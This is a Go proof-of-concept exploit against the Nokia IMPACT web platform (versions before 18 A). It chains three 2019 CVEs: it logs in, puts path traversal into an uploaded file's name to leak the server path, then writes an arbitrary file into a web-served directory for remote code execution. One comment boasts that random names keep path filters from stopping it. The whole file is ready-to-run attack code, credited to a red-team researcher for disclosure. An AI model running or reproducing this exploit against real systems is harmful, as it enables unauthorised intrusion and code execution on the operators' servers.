// Nokia IMPACT web platform < 18 A
// Chaining CVE-2019-17403, CVE-2019-17404 and CVE -2019-17406 - (Full Path disclosure, Unrestricted File Upload and Path Traversal in /ui/deviceImport leading to post-auth RCE PoC)
// Reference of Research: https://www.telecomitalia.com/tit/it/innovazione/cybersecurity/red-team.html
// PoC Author: Francesco Giordano (Telsy SpA)

package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/textproto"
	"net/url"
	"os"
	"regexp"
	"strings"
)

var target string
var user string
var pwd string

func init() {
	flag.StringVar(&target, "url", "", "target URL")
	flag.StringVar(&user, "user", "", "username")
	flag.StringVar(&pwd, "pwd", "", "password")
}

func main() {
	fmt.Println("NOKIA IMPACT - Full Path Disclosure, Path traversal and Unrestricted file Upload Leading to RCE")
	flag.Parse()
	if (target == "") || (user == "") || (pwd == "") {
		usage()
	}

	cjar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cjar,
	}
	//first request needed to start the login chalenge
	sendGET(client, target+"/ui")
	//actual login
	login(client, target+"/ui/j_security_check")
	fmt.Println("[+] Leaking Full Path")
	//if this is not working we can use /ui/rest/deviceimport
	body := uploadFile(client, target+"/ui/rest-proxy/deviceimport", "../"+randstring()+"/"+randstring()+".csv", "pwned")
	//looking for the path, ugly way but is just a PoC
	var re = regexp.MustCompile(`(?m)\/.*.csv`)
	match := re.FindString(body)
	if match != "" {
		fmt.Println("[+] Full Path:" + strings.Split(match, "..")[0])
	} else {
		fmt.Println("Unable to leak full path")
		os.Exit(1)
	}
	//asking the user for a relative path to a directory server by apache or jboss
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter the relative path (starting from the leaked full Path) to a directory served by JBOSS or Apache: ")
	payload, _ := reader.ReadString('\n')
	if payload == "" {
		fmt.Println("Nop")
		os.Exit(1)
	}
	uploadFile(client, target+"/ui/rest-proxy/deviceimport", payload, "pwned")
	fmt.Println("[+] File Created!")

}

func usage() {
	fmt.Println("go run nokia_impact_rce.go -user [username] -pwd [password] -url [https://mytarget.enterprise]")
	os.Exit(1)
}

func sendGET(client *http.Client, url string) {
	req, _ := http.NewRequest("GET", url, nil)
	_, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func login(client *http.Client, target string) {
	param := url.Values{}
	param.Set("j_username", user)
	param.Set("j_password", pwd)
	req, err := http.NewRequest("POST", target, strings.NewReader(param.Encode()))
	if err != nil {
		panic(err)
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	_, err = client.Do(req)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

//Build a multipart request with out payload in filename
func uploadFile(client *http.Client, target string, path string, filecontent string) string {

	buf := &bytes.Buffer{}

	w := multipart.NewWriter(buf)
	h := make(textproto.MIMEHeader)
	h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, "fileupload", path))
	h.Set("Content-Type", "image/jpeg")
	k, _ := w.CreatePart(h)
	_, err := io.Copy(k, bytes.NewReader([]byte(filecontent)))
	w.Close()

	req, err := http.NewRequest("POST", target, buf)
	if err != nil {
		panic(err)
	}
	req.Header.Add("Content-Type", "multipart/form-data; boundary="+w.Boundary())
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	return bodyString
}

//generates a random string. We use this function so the exploit can't be "mitigated" by just adding a filter on the paths used
func randstring() string {
	b := make([]byte, 10)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return fmt.Sprintf("%X", b)
}
